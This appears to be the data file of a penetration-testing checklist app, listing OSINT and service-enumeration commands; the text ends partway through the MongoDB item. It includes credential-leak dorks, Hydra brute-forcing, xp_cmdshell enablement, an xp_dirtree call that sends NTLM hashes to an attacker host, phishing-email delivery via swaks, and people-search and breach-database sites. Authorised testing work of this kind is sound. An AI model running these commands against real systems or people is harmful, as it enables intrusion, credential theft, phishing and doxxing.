const STORAGE_KEY = 'securitytracker-template-v3';
const EVIDENCE_DB_NAME = 'securitytracker-evidence-db';
const EVIDENCE_DB_VERSION = 1;
const EVIDENCE_STORE_NAME = 'evidence_files';

const checklistPhases = [
  {
    id: 'osint',
    name: 'OSINT',
    optional: true,
    items: [
      { id: 'osint-1', name: 'Google Dorking', description: 'Use Google search operators to find exposed files, admin panels, and directory listings.', commands: [
        { desc: 'Target Scoping', cmd: 'site:example.com\nsite:*.example.com\n-site:example.com\nsite:example.com OR site:example.net' },
        { desc: 'Logical Operators', cmd: 'example1 AND example2\nexample1 OR example2\nexample1 | example2\nexample1 && example2\n(example1 OR example2) AND example3' },
        { desc: 'Wildcards & Fuzzing', cmd: 'example*test\nexample * test\nadmin*login\npassword*reset' },
        { desc: 'Exact Matching / Ordering', cmd: '"example1 example2"\n"example1 example2 example3"' },
        { desc: 'File Type Discovery', cmd: 'filetype:pdf\nfiletype:doc\nfiletype:docx\nfiletype:xls\nfiletype:xlsx\nfiletype:csv\nfiletype:txt\nfiletype:log\nfiletype:conf\nfiletype:cfg\nfiletype:ini\nfiletype:sql\nfiletype:bak\nfiletype:old\nfiletype:zip\nfiletype:rar\nfiletype:7z\nfiletype:tar\nfiletype:gz\nfiletype:json\nfiletype:xml\nfiletype:yml\nfiletype:yaml\nsite:example.com filetype:sql' },
        { desc: 'URL-Based Discovery', cmd: 'inurl:admin\ninurl:login\ninurl:signin\ninurl:signup\ninurl:register\ninurl:upload\ninurl:download\ninurl:backup\ninurl:test\ninurl:dev\ninurl:staging\ninurl:old\ninurl:api\ninurl:v1\ninurl:v2\ninurl:php?id=\ninurl:cmd=\ninurl:exec=\ninurl:query=' },
        { desc: 'Page Content Discovery', cmd: 'intext:password\nintext:username\nintext:credentials\nintext:apikey\nintext:"api key"\nintext:"secret key"\nintext:"access token"\nintext:"confidential"\nintext:"internal use only"' },
        { desc: 'Title-Based Discovery', cmd: 'intitle:admin\nintitle:login\nintitle:dashboard\nintitle:index.of\nintitle:"index of"\nintitle:"parent directory"' },
        { desc: 'Directory Listings / Misconfigurations', cmd: 'intitle:"index of" "backup"\nintitle:"index of" ".git"\nintitle:"index of" ".env"\nintitle:"index of" ".ssh"' },
        { desc: 'Technology Fingerprinting', cmd: 'inurl:wp-admin\ninurl:wp-content\ninurl:wp-includes\ninurl:phpmyadmin\nintitle:phpMyAdmin\ninurl:jira\ninurl:confluence\ninurl:jenkins' },
        { desc: 'Credentials & Secrets Leakage', cmd: 'filetype:env "DB_PASSWORD"\nfiletype:env "AWS_SECRET"\nfiletype:env "API_KEY"\nfiletype:json "access_token"\nfiletype:yaml "password:"\nintext:"BEGIN RSA PRIVATE KEY"\nintext:"BEGIN OPENSSH PRIVATE KEY"' },
        { desc: 'Cloud & DevOps Artifacts', cmd: 'filetype:tf\nfiletype:tfvars\nfiletype:dockerfile\nfiletype:docker-compose\nfiletype:helm\nfiletype:kubeconfig' },
        { desc: 'Error & Debug Exposure', cmd: 'intext:"stack trace"\nintext:"exception"\nintext:"fatal error"\nintext:"debug=true"' },
        { desc: 'User-Generated Content / Leaks', cmd: 'site:pastebin.com example.com\nsite:github.com example.com\nsite:gitlab.com example.com\nsite:bitbucket.org example.com\nsite:stackoverflow.com "example.com"' },
        { desc: 'Authentication & Access Control', cmd: 'inurl:reset\ninurl:forgot\ninurl:password\nintitle:"two-factor"\nintitle:"2fa"' },
        { desc: 'Historical / Cached Data', cmd: 'cache:example.com\nsite:web.archive.org example.com' },
        { desc: 'Removals / Noise Reduction', cmd: '-site:facebook.com\n-site:twitter.com\n-site:linkedin.com\n-example -test -sample' },
        { desc: 'High-Value Combined Patterns', cmd: 'site:example.com (filetype:env OR filetype:conf)\n(inurl:admin OR inurl:login) site:example.com\nintitle:"index of" (backup OR db OR sql)' },
      ] },
      { id: 'osint-2', name: 'WHOIS Lookup', description: 'Identify registration and ownership details for a domain or IP address.', commands: [
        { desc: 'Basic Domain Registration', cmd: 'whois target.com' },
        { desc: 'Subdomain (may fall back to parent domain)', cmd: 'whois sub.target.com' },
        { desc: 'IP Address Registration', cmd: 'whois 10.10.10.5\nwhois 8.8.8.8' },
        { desc: 'CIDR / Netblock Ownership', cmd: 'whois 10.10.10.0/24' },
        { desc: 'TLD-Specific WHOIS (bypasses generic resolvers)', cmd: 'whois -h whois.verisign-grs.com target.com\nwhois -h whois.iana.org target.com' },
        { desc: 'Registrar-Specific WHOIS', cmd: 'whois -h whois.godaddy.com target.com\nwhois -h whois.namecheap.com target.com' },
        { desc: 'Nameserver Enumeration', cmd: 'whois target.com | grep -i "name server"\nwhois target.com | grep -i "nserver"' },
        { desc: 'Registrar / Organization / Abuse Contacts', cmd: 'whois target.com | grep -i "registrar"\nwhois target.com | grep -i "org"\nwhois target.com | grep -i "abuse"' },
        { desc: 'Dates (Attack Surface Timing)', cmd: 'whois target.com | grep -i "creation"\nwhois target.com | grep -i "updated"\nwhois target.com | grep -i "expiry"' },
        { desc: 'Reverse WHOIS (email / org reuse indicators)', cmd: 'whois target.com | grep -Ei "email|e-mail|mail"' },
        { desc: 'ASN Discovery (pivot to infrastructure scope)', cmd: 'whois 10.10.10.5 | grep -i "origin"\nwhois 10.10.10.5 | grep -i "asn"' },
        { desc: 'RIR-Specific Queries', cmd: 'whois -h whois.arin.net 10.10.10.5\nwhois -h whois.ripe.net 10.10.10.5\nwhois -h whois.apnic.net 10.10.10.5\nwhois -h whois.lacnic.net 10.10.10.5\nwhois -h whois.afrinic.net 10.10.10.5' },
        { desc: 'Organization Netblocks (scope expansion candidate)', cmd: 'whois 10.10.10.5 | grep -i "netrange"\nwhois 10.10.10.5 | grep -i "cidr"' },
        { desc: 'Privacy / Proxy Detection', cmd: 'whois target.com | grep -Ei "privacy|proxy|redacted"' },
        { desc: 'Email Infrastructure Clues', cmd: 'whois target.com | grep -Ei "mx|mail"' },
      ] },
      { id: 'osint-3', name: 'DNS Enumeration', description: 'Enumerate DNS records to map infrastructure and find weak points.', commands: [
        { desc: 'DNS Banner Grabbing', cmd: 'dig @<TARGET_IP> version.bind CHAOS TXT\nnmap -sV -p 53 --script=dns-nsid -Pn <TARGET_IP>' },
        { desc: 'DNS Enumeration', cmd: 'whois <DOMAIN_OR_IP>\nhost <HOSTNAME> <DNS_SERVER>\nhost -l <DOMAIN> <DNS_SERVER>\ndig @<DNS_SERVER> -x <IP_ADDRESS>\ndig @<DNS_SERVER> <DOMAIN> <RECORD_TYPE>\ndig @ns1.<DOMAIN> <DOMAIN> <RECORD_TYPE>' },
        { desc: 'TLS CN → DNS Zone Transfer Check', subdesc: 'Nmap shows TLS cert with commonName=mysite.test. DNS service is running — test for misconfigured AXFR.', cmd: 'host -T -l <DOMAIN.LOCAL> <TARGET_IP>' },
        { desc: 'Post-Zone-Transfer: HTTP Host Enumeration', cmd: 'gobuster dns -r <TARGET_IP> -d <DOMAIN.LOCAL> -w /usr/share/seclists/Discovery/DNS/namelist.txt -t 100\nffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://<RHOST>/ -H "Host: FUZZ.<RHOST>" -fs 185' },
        { desc: 'DNS Zone Transfer Attacks', cmd: 'dig @<DOMAIN_IP> <DOMAIN> AXFR\ndnsrecon -d <DOMAIN> -a' },
        { desc: 'DNS Configuration Files (Linux)', cmd: '/etc/host.conf\n/etc/resolv.conf\n/etc/named.conf\n/etc/bind/named.conf\n/etc/bind/named.conf.local' },
      ] },
      { id: 'osint-4', name: 'Subdomain Enumeration', description: 'Discover subdomains using passive and active enumeration methods.', commands: [
        { desc: 'Passive Subdomain Discovery (Primary)', cmd: 'subfinder -d target.com -silent -o subdomains.txt\nsubfinder -d target.com -all -recursive -json -o subfinder.json' },
        { desc: 'Multi-Source Subdomain Enumeration', cmd: 'amass enum -passive -d target.com -o amass_passive.txt\namass enum -passive -d target.com -src -d target.com -o amass_sources.txt' },
        { desc: 'Active Subdomain Enumeration (Escalation)', subdesc: 'Use only when allowed by scope.', cmd: 'amass enum -active -d target.com -o amass_active.txt\namass enum -brute -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o amass_bruteforce.txt' },
      ] },
      { id: 'osint-5', name: 'Email Harvesting', description: 'Collect email addresses linked to the target domain from all available public sources.', commands: [
        { desc: 'Harvest emails and names from all available public sources', cmd: 'theHarvester -d target.com -b all' },
      ] },
      { id: 'osint-6', name: 'Shodan / Censys Recon', description: 'Find exposed services, open ports, and banners indexed by Shodan.', commands: [
        { desc: 'Search for all services associated with the target domain', cmd: 'shodan search hostname:target.com' },
        { desc: 'Inspect all exposed services and banners on a specific IP', cmd: 'shodan host <TARGET_IP>' },
      ] },
      { id: 'osint-7', name: 'Social Media / LinkedIn Recon', description: 'Manually gather employee names, job titles, technology stack clues, and org structure from LinkedIn, Twitter, and company pages.' },
      { id: 'osint-8', name: 'GitHub / Paste Sites', description: 'Search GitHub, GitLab, Pastebin, and similar sites for leaked source code, API keys, credentials, or internal references tied to the target.' },
      { id: 'osint-9', name: 'Automated Scripts', description: 'End-to-end OSINT automation scripts that chain multiple tools together.', commands: [
        { desc: 'Basic OSINT Recon Script', subdesc: 'Usage: ./recon.sh target.com — Runs WHOIS, subfinder, assetfinder, httprobe, and gowitness in sequence. Creates organized output directories. Comment out any sections you may not require.', cmd: '#!/bin/bash\n\n# Use the first argument as the domain name\ndomain=$1\n# Define colors\nRED="\\033[1;31m"\nRESET="\\033[0m"\n\n# Define directories\nbase_dir="$domain"\ninfo_path="$base_dir/info"\nsubdomain_path="$base_dir/subdomains"\nscreenshot_path="$base_dir/screenshots"\n\n# Create directories if they don\'t exist\nfor path in "$info_path" "$subdomain_path" "$screenshot_path"; do\n    if [ ! -d "$path" ]; then\n        mkdir -p "$path"\n        echo "Created directory: $path"\n    fi\ndone\n\necho -e "${RED} [+] Checking who it is ... ${RESET}"\nwhois "$domain" > "$info_path/whois.txt"\n\necho -e "${RED} [+] Launching subfinder ... ${RESET}"\nsubfinder -d "$domain" > "$subdomain_path/found.txt"\n\necho -e "${RED} [+] Running assetfinder ... ${RESET}"\nassetfinder "$domain" | grep "$domain" >> "$subdomain_path/found.txt"\n\necho -e "${RED} [+] Checking what\\\'s alive ... ${RESET}"\ncat "$subdomain_path/found.txt" | grep "$domain" | sort -u | httprobe -prefer-https | grep https | sed \'s/https\\?:\\/\\///\' | tee -a "$subdomain_path/alive.txt"\n\necho -e "${RED} [+] Taking screenshots ... ${RESET}"\ngowitness file -f "$subdomain_path/alive.txt" -P "$screenshot_path/" --no-http' },
      ] },
      { id: 'osint-10', name: 'OSINT Reconnaissance: People', description: 'Search for people, phone numbers, and voter registration records using public lookup services.', commands: [
        { desc: 'People Search Engines', cmd: 'https://www.whitepages.com/\nhttps://www.truepeoplesearch.com/\nhttps://www.fastpeoplesearch.com/\nhttps://www.fastbackgroundcheck.com/\nhttps://webmii.com/\nhttps://peekyou.com/\nhttps://www.411.com/\nhttps://www.spokeo.com/\nhttps://thatsthem.com/' },
        { desc: 'Voter Registration Records', cmd: 'https://voterrecords.com/' },
        { desc: 'Phone Number Lookup', cmd: 'https://www.truecaller.com/\nhttps://calleridtest.com/\nhttps://infobel.com/' },
      ] },
      { id: 'osint-11', name: 'OSINT Reconnaissance: Email', description: 'Discover, verify, and harvest email addresses tied to a target domain.', commands: [
        { desc: 'Email Discovery & Harvesting', cmd: 'https://hunter.io/\nhttps://phonebook.cz/\nhttps://www.voilanorbert.com/' },
        { desc: 'Email Verification', cmd: 'https://tools.verifyemailaddress.io/\nhttps://email-checker.net/validate' },
        { desc: 'Harvest emails from all public sources', cmd: 'theHarvester -d target.com -b all' },
      ] },
      { id: 'osint-12', name: 'OSINT Reconnaissance: Usernames & Passwords', description: 'Check for credential leaks, enumerate usernames across platforms, and identify reused accounts.', commands: [
        { desc: 'Password Breach Databases', cmd: 'https://haveibeenpwned.com/\nhttps://weleakinfo.to/v2/\nhttps://leakcheck.io/\nhttps://snusbase.com/\nhttps://scylla.sh/' },
        { desc: 'Username Enumeration (Online)', cmd: 'https://namechk.com/\nhttps://whatsmyname.app/\nhttps://namecheckup.com/' },
        { desc: 'Username Enumeration (Sherlock)', subdesc: 'Sherlock searches 400+ social networks for matching usernames.', cmd: 'sherlock <USERNAME>\nsherlock <USERNAME> --output results.txt\nsherlock <USERNAME> --print-found\nsherlock <USER1> <USER2> <USER3>' },
      ] },
      { id: 'osint-13', name: 'OSINT Reconnaissance: Social Media', description: 'Gather intelligence from social media platforms including Twitter, Instagram, Snapchat, and TikTok.', commands: [
        { desc: 'Twitter / X', cmd: 'https://twitter.com/search-advanced\nhttps://github.com/rmdir-rp/OSINT-twitter-tools' },
        { desc: 'Instagram', cmd: 'https://imginn.com/' },
        { desc: 'Snapchat', cmd: 'https://map.snapchat.com/' },
      ] },
      { id: 'osint-14', name: 'OSINT Reconnaissance: Images', description: 'Reverse image search and EXIF metadata extraction for location and device intelligence.', commands: [
        { desc: 'Reverse Image Search', subdesc: 'Most useful for identifying locations from background context like buildings, signs, and landmarks.', cmd: 'https://images.google.com/\nhttps://tineye.com/\nhttps://yandex.com/images/' },
        { desc: 'EXIF Metadata Extraction', subdesc: 'Social media platforms strip EXIF data on upload, but direct file transfers and some websites preserve it.', cmd: 'exiftool <IMAGE_FILE>\nexiftool -gps* <IMAGE_FILE>\nhttps://jimpl.com/' },
      ] },
      { id: 'osint-15', name: 'OSINT Reconnaissance: Websites', description: 'Fingerprint web technologies, analyze DNS records, scan for threats, and monitor website changes.', commands: [
        { desc: 'Technology Fingerprinting & DNS', cmd: 'https://builtwith.com/\nhttps://centralops.net/co/\nhttps://dnslytics.com/reverse-ip\nhttps://spyonweb.com/\nhttps://viewdns.info/' },
        { desc: 'Threat Intelligence & Scanning', cmd: 'https://www.virustotal.com/\nhttps://urlscan.io/\nhttps://web-check.as93.net/' },
        { desc: 'DNS & Certificate Transparency', cmd: 'https://dnsdumpster.com/\nhttps://crt.sh/' },
        { desc: 'Infrastructure Discovery', cmd: 'https://shodan.io/\nshodan search hostname:target.com\nshodan host <TARGET_IP>' },
        { desc: 'Website Monitoring & Historical Data', cmd: 'https://visualping.io/\nhttp://backlinkwatch.com/index.php\nhttps://web.archive.org/' },
      ] },
      { id: 'osint-16', name: 'OSINT Reconnaissance: Business', description: 'Investigate corporate registrations, organizational structure, and business intelligence.', commands: [
        { desc: 'Corporate Registry & Business Intelligence', cmd: 'https://opencorporates.com/\nhttps://www.aihitdata.com/' },
      ] },
    ],
  },
  {
    id: 'recon',
    name: 'Enumeration',
    optional: false,
    items: [
      { id: 'recon-2', name: 'TCP Port Scan (Full)', description: 'Full TCP port coverage with OS detection and aggressive scan settings.', commands: [
        { desc: 'Full TCP scan with OS and version detection at high speed', cmd: 'nmap -p- -O -sC -sV -A --min-rate 5000 <TARGET_IP>' },
      ]},
      { id: 'recon-3', name: 'UDP Port Scan', description: 'Scan the most common UDP services for exposure.', commands: [
        { desc: 'Scan top 100 UDP ports', cmd: 'nmap -sU --top-ports 100 <TARGET_IP>' },
      ]},
      { id: 'recon-4', name: 'FTP Enumeration (21)', description: 'Check for anonymous access, grab files, and bruteforce credentials.', commands: [
        { desc: 'Attempt anonymous FTP login (use "passive" if 229 error)', cmd: 'ftp anonymous@<TARGET_IP>' },
        { desc: 'Grab all files from an anonymous share', cmd: 'binary\nPROMPT OFF\nmget *' },
        { desc: 'Bruteforce FTP credentials with Hydra', subdesc: '-s <port-num> specify non-default port | -f exit after first valid login | -u try each username with all passwords before moving on', cmd: 'hydra -v -L users.txt -P /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://<TARGET_IP> -t 4' },
      ]},
      { id: 'recon-5', name: 'SSH Enumeration (22)', description: 'Audit SSH config, grab banners, and bruteforce credentials.', commands: [
        { desc: 'Audit SSH server configuration and supported ciphers', cmd: 'ssh-audit <TARGET_IP>' },
        { desc: 'Grab SSH banner using legacy key exchange', cmd: 'ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 <TARGET_IP>' },
        { desc: 'Bruteforce SSH credentials with Hydra', subdesc: '-f exit after first valid login | -u try each username with all passwords before moving on', cmd: 'hydra -L users.txt -P passwords.txt -t 6 -vV ssh://<TARGET_IP>' },
      ]},
      { id: 'recon-6', name: 'SMTP Enumeration (25/465/587)', description: 'Enumerate mail users, verify addresses manually, and send phishing test emails.', commands: [
        { desc: 'Enumerate SMTP users with nmap script', cmd: 'nmap -p 25 --script=smtp-enum-users <TARGET_IP>' },
        { desc: 'Manually verify an email address via VRFY', cmd: 'nc -nv <TARGET_IP> 25\nVRFY <username>' },
        { desc: 'Send a phishing test email with attachment (SWAKS)', cmd: 'swaks --to receiver@mail.com --from sender@mail.com --auth LOGIN --auth-user sender@mail.com --header-X-Test "Header" --server <TARGET_IP> --attach file.txt' },
      ]},
      { id: 'recon-7', name: 'DNS Enumeration (53)', description: 'Banner grabbing, DNS enumeration, zone transfer testing, and subdomain discovery.', commands: [
        { desc: 'Banner grabbing and DNS version info', cmd: 'dig @<TARGET_IP> version.bind CHAOS TXT\nnmap -sV --script dns-nsid -p53 -Pn <TARGET_IP>' },
        { desc: 'DNS record enumeration (whois, host, dig)', cmd: 'whois <DOMAIN>\nhost <DOMAIN> <TARGET_IP>\nhost -l <DOMAIN> <TARGET_IP>\ndig @<TARGET_IP> -x <TARGET_IP>\ndig @<TARGET_IP> <DOMAIN> ANY' },
        { desc: 'Zone transfer test', cmd: 'host -T -l <DOMAIN> <TARGET_IP>\ndig @<TARGET_IP> <DOMAIN> AXFR\ndnsrecon -d <DOMAIN> -a' },
        { desc: 'Subdomain enumeration (gobuster and ffuf)', cmd: 'gobuster dns -r <TARGET_IP> -d <DOMAIN> -w /usr/share/seclists/Discovery/DNS/namelist.txt -t 100\nffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://<RHOST>/ -H "Host: FUZZ.<RHOST>" -fs 185' },
      ]},
      { id: 'recon-8', name: 'HTTP Enumeration (80/443)', description: 'Web server fingerprinting, header inspection, technology enumeration, and default credential checks. Also manually review page source, robots.txt, sitemap.xml, and any login/upload portals.', commands: [
        { desc: 'Fingerprint web server with nmap http-enum', cmd: 'nmap -p 80 -sV --script=http-enum <TARGET_IP>' },
        { desc: 'Grab HTTP headers and follow redirects', cmd: 'curl -IL http://<TARGET_IP>' },
        { desc: 'Technology fingerprinting with WhatWeb', cmd: 'whatweb -a 3 http://<TARGET_IP>\nwhatweb --no-errors <TARGET_SUBNET>/24' },
      ]},
      { id: 'recon-9', name: 'Directory Busting (HTTP)', description: 'Directory and file fuzzing on the web server.', commands: [
        { desc: 'Fuzz directories and files with gobuster', cmd: 'gobuster dir -u http://<TARGET_IP> -w <WORDLIST>' },
      ]},
      { id: 'recon-10', name: 'Nikto Scan (HTTP)', description: 'Web misconfiguration and vulnerability scan.', commands: [
        { desc: 'Run a full Nikto scan and save output', cmd: 'nikto -h http://<TARGET_IP> -o nikto_output.txt' },
      ]},
      { id: 'recon-11', name: 'SMB Enumeration (139/445)', description: 'Anonymous access, null sessions, share enumeration, SMB login with password/hash, and bruteforce.', commands: [
        { desc: 'Anonymous and null session login attempts', cmd: 'smbclient -L //<TARGET_IP> -U anonymous\nsmbclient -N -L //<TARGET_IP>\nsmbclient -N //<TARGET_IP>/<SHARE>' },
        { desc: 'CrackMapExec enumeration (users, password policy, shares)', cmd: 'crackmapexec smb <TARGET_IP> -u "" -p "" --users --rid-brute\ncrackmapexec smb <TARGET_IP> -u "" -p "" --pass-pol\ncrackmapexec smb <TARGET_IP> -u "" -p "" --shares\ncrackmapexec smb <TARGET_IP> -u "" -p "" --spider <SHARE> --regex .' },
        { desc: 'Enum4Linux and nmap SMB scripts', cmd: 'enum4linux -a <TARGET_IP>\nnmap -v -p 139,445 --script smb-os-discovery <TARGET_IP>\nnmap --script smb-vuln* -p 139,445 <TARGET_IP>' },
        { desc: 'Authenticated SMB login (password and NTLM hash)', subdesc: 'Inside smbclient: RECURSE ON / PROMPT OFF / mget *', cmd: 'smbclient //<TARGET_IP>/SYSVOL -U <USER>\nsmbclient -p 445 //<TARGET_IP>/<SHARE> -U <USER> --password=<PASS>\nsmbclient -L //<TARGET_IP> -U <DOMAIN>/<USER> --pw-nt-hash <HASH>' },
        { desc: 'Bruteforce SMB credentials with Hydra', cmd: 'hydra -L users.txt -P passwords.txt -t 1 -vV smb://<TARGET_IP>' },
      ]},
      { id: 'recon-12', name: 'SNMP Enumeration (161)', description: 'Scan for SNMP, bruteforce community strings, and enumerate Windows users/processes/software via MIB OIDs.', commands: [
        { desc: 'Scan subnet for open SNMP ports', cmd: 'nmap -sU --open -p 161 <TARGET_SUBNET> -oG open-snmp.txt' },
        { desc: 'Bruteforce SNMP community strings', cmd: 'onesixtyone -c <COMMUNITY-STRINGS-LIST> -i <IP-RANGES>' },
        { desc: 'SNMP walk with public community string', cmd: 'snmpwalk -c public -v1 -t 10 <TARGET_IP>' },
        { desc: 'Enumerate Windows users, processes, software, and open ports via MIB OIDs', subdesc: 'Windows Users → .77.1.2.25 | Running Processes → .25.4.2.1.2 | Installed Software → .25.6.3.1.2 | TCP Listening Ports → .6.13.1.3', cmd: 'snmpwalk -c public -v1 <TARGET_IP> 1.3.6.1.4.1.77.1.2.25\nsnmpwalk -c public -v1 <TARGET_IP> 1.3.6.1.2.1.25.4.2.1.2\nsnmpwalk -c public -v1 <TARGET_IP> 1.3.6.1.2.1.25.6.3.1.2\nsnmpwalk -c public -v1 <TARGET_IP> 1.3.6.1.2.1.6.13.1.3' },
      ]},
      { id: 'recon-13', name: 'LDAP / Global Catalog Enumeration (389/636/3268/3269)', description: 'Anonymous and authenticated LDAP enumeration, record extraction, and domain component queries.', commands: [
        { desc: 'Anonymous LDAP enumeration with auto-derived base DN', cmd: 'target_domain=\'domain.tld\'\ntarget_hostname="DC01.${target_domain}"\ndomain_component=$(echo $target_domain | tr \'.\' \'\\n\' | xargs -I % echo "DC=%" | paste -sd, -)\nldapsearch -x -H ldap://$target_hostname -b $domain_component' },
        { desc: 'Alternative anonymous LDAP queries', cmd: 'ldapsearch -x -h <TARGET_IP> -s base namingcontexts\nldapsearch -x -h <TARGET_IP> -s sub -b \'DC=domain,DC=tld\'' },
        { desc: 'Authenticated LDAP search and full object dump', cmd: 'ldapsearch -x -H ldap://<TARGET_IP> -D \'<DOMAIN>\\<USER>\' -w \'<PASS>\' -b \'DC=domain,DC=tld\' sAMAccountName\nldapsearch -x -H ldap://<TARGET_IP> -b $domain_component \'objectClass=*\'' },
      ]},
      { id: 'recon-14', name: 'MSSQL Enumeration (1433)', description: 'MSSQL nmap scripts, impacket client, database queries, xp_cmdshell RCE, and xp_dirtree NTLM capture.', commands: [
        { desc: 'MSSQL enumeration using nmap scripts', cmd: 'nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <TARGET_IP>' },
        { desc: 'Connect with impacket MSSQL client', cmd: 'impacket-mssqlclient Administrator:Pass@<TARGET_IP> -windows-auth\nimpacket-mssqlclient <DOMAIN>/<USER>:<PASS>@<TARGET_IP>' },
        { desc: 'Basic database queries', cmd: 'select @@version;\nSELECT name from sys.databases;\nUSE <database-name>;\nSELECT * FROM <database>.INFORMATION_SCHEMA.TABLES;\nSELECT * FROM <database>.dbo.<table>;' },
        { desc: 'Enable and use xp_cmdshell for OS command execution', cmd: 'enable_xp_cmdshell\nEXEC sp_configure \'show advanced options\', 1;\nRECONFIGURE;\nEXEC sp_configure \'xp_cmdshell\', 1;\nRECONFIGURE;\nEXEC xp_cmdshell "whoami"' },
        { desc: 'Force NTLM authentication capture with xp_dirtree', cmd: 'EXEC xp_dirtree \'\\\\<LHOST>\\share\'' },
      ]},
      { id: 'recon-15', name: 'MySQL Enumeration (3306)', description: 'MySQL login, version check, database listing, and data extraction.', commands: [
        { desc: 'Login to MySQL server', cmd: 'mysql -u <username> -p <password> -h <TARGET_IP> -P 3306 --skip-ssl-verify-server-cert' },
        { desc: 'Check version, current user, list databases, and query tables', cmd: 'select version();\nselect system_user();\nshow databases;\nuse <database-name>;\nselect * from <table> \\G' },
      ]},
      { id: 'recon-16', name: 'RDP Enumeration (3389)', description: 'RDP encryption enumeration and vulnerability checks (MS12-020).', commands: [
        { desc: 'Enumerate RDP encryption, vulnerabilities, and NTLM info', cmd: 'nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 <TARGET_IP>' },
      ]},
      { id: 'recon-17', name: 'WinRM Check (5985/5986)', description: 'Validate WinRM access with known credentials.', commands: [
        { desc: 'Connect to WinRM with evil-winrm', cmd: 'evil-winrm -i <TARGET_IP> -u <USER> -p <PASS>' },
      ]},
      { id: 'recon-18', name: 'Finger Enumeration (79)', description: 'Enumerate users via Finger protocol using manual queries and automated scripts.', commands: [
        { desc: 'Basic user enumeration via Finger', cmd: 'finger @<TARGET_IP>\nfinger admin@<TARGET_IP>' },
        { desc: 'Automated user enumeration with finger-user-enum.pl', cmd: 'finger-user-enum.pl -U users.txt -t <TARGET_IP>\nfinger-user-enum.pl -u root -t <TARGET_IP>' },
        { desc: 'Enumerate against a full wordlist and filter results', cmd: 'perl finger-user-enum.pl -t <TARGET_IP> -U /usr/share/wordlists/seclists/Usernames/Names/names.txt | grep -win "Login"' },
      ]},
      { id: 'recon-19', name: 'Kerberos Enumeration (88)', description: 'Enumerate Kerberos users with nmap and kerbrute, and extract SPNs with credentials.', commands: [
        { desc: 'Enumerate Kerberos users with nmap krb5-enum-users', cmd: 'nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=\'domain.local\',userdb="/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt" <TARGET_IP>' },
        { desc: 'Enumerate Kerberos users with Kerbrute', cmd: './kerbrute userenum --dc <TARGET_IP> -d <DOMAIN> /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt' },
        { desc: 'Extract SPNs (requires valid credentials)', cmd: 'GetUserSPNs.py -request -dc-ip <TARGET_IP> <DOMAIN>/<USER>' },
      ]},
      { id: 'recon-20', name: 'MSRPC Enumeration (135)', description: 'MSRPC null auth, domain user/group enumeration, and RPC command reference.', commands: [
        { desc: 'MSRPC enumeration with nmap and rpcclient null/empty auth', cmd: 'nmap -A -sV -sC -Pn --script=msrpc-enum <TARGET_IP> -p135\nrpcclient <TARGET_IP> -N\nrpcclient -U "%" <TARGET_IP>' },
        { desc: 'Enumerate domain users and groups inside rpcclient', cmd: 'enumdomusers\nquerydispinfo\nqueryuser <RID>\nenumprinters\nenumdomgroups\nquerygroup <RID>\nquerygroupmem <RID>' },
        { desc: 'Change a user\'s password via RPC', cmd: 'setuserinfo2 <username> 23 <password>' },
      ]},
      { id: 'recon-21', name: 'IMAP/IMAPS Enumeration (143/993)', description: 'IMAP NTLM enumeration, mailbox login, message retrieval, and phishing email delivery.', commands: [
        { desc: 'Enumerate IMAP NTLM info with nmap', cmd: 'nmap -p 143 --script imap-ntlm-info.nse <TARGET_IP>' },
        { desc: 'Connect and interact with mailbox via IMAP commands', subdesc: 'After connecting with nc, run the following IMAP tag commands:', cmd: 'nc <TARGET_IP> 143\ntag login USER@localhost PASSWORD\ntag LIST "" "*"\ntag SELECT INBOX\ntag STATUS INBOX (MESSAGES)\ntag fetch <num-of-messages> BODY[HEADER] BODY[1]' },
        { desc: 'Deliver phishing email with attachment via SWAKS', cmd: 'swaks --to target@domain --from jonas@domain --attach @file.ods --server <TARGET_IP> --body "Please check this out" --header "Subject: IMPORTANT UPDATE"' },
      ]},
      { id: 'recon-22', name: 'POP3/POP3S Enumeration (110/995)', description: 'POP3 service and auth method checks.', commands: [
        { desc: 'Enumerate POP3 capabilities and NTLM auth info', cmd: 'nmap --script pop3-capabilities,pop3-ntlm-info -p110,995 <TARGET_IP>' },
      ]},
      { id: 'recon-23', name: 'NFS / rpcbind Enumeration (111/2049)', description: 'Enumerate NFS exports and mount remote shares locally.', commands: [
        { desc: 'List NFS exports on the target', cmd: 'showmount -e <TARGET_IP>' },
        { desc: 'Mount the NFS share locally', cmd: 'mkdir nfstarget\nsudo mount -t nfs <TARGET_IP>:/mnt/backups/ nfstarget -o nolock' },
      ]},
      { id: 'recon-24', name: 'PostgreSQL Enumeration (5432)', description: 'PostgreSQL login, database listing, table enumeration, and data extraction.', commands: [
        { desc: 'Login to PostgreSQL server', cmd: 'psql -h <TARGET_IP> -p 5432 -U <username>' },
        { desc: 'List databases, connect, enumerate tables, and query data', cmd: '\\x on\n\\l;\n\\c <database>;\n\\dt;\nSELECT * FROM "TABLE-NAME";' },
      ]},
      { id: 'recon-25', name: 'Oracle TNS Enumeration (1521)', description: 'Oracle listener version detection and SID discovery.', commands: [
        { desc: 'Detect Oracle TNS listener version', cmd: 'nmap --script oracle-tns-version -p1521 <TARGET_IP>' },
        { desc: 'Guess Oracle SIDs with ODAT', cmd: 'odat sidguesser -s <TARGET_IP>' },
      ]},
      { id: 'recon-26', name: 'Redis Enumeration (6379)', description: 'Redis unauthenticated exposure and configuration checks.', commands: [
        { desc: 'Retrieve Redis server info via CLI', cmd: 'redis-cli -h <TARGET_IP> -p 6379 INFO' },
        { desc: 'Enumerate Redis with nmap info script', cmd: 'nmap --script redis-info -p6379 <TARGET_IP>' },
      ]},
      { id: 'recon-27', name: 'MongoDB Enumeration (27017)', description: 'MongoDB unauthenticated access and database discovery.', commands: [
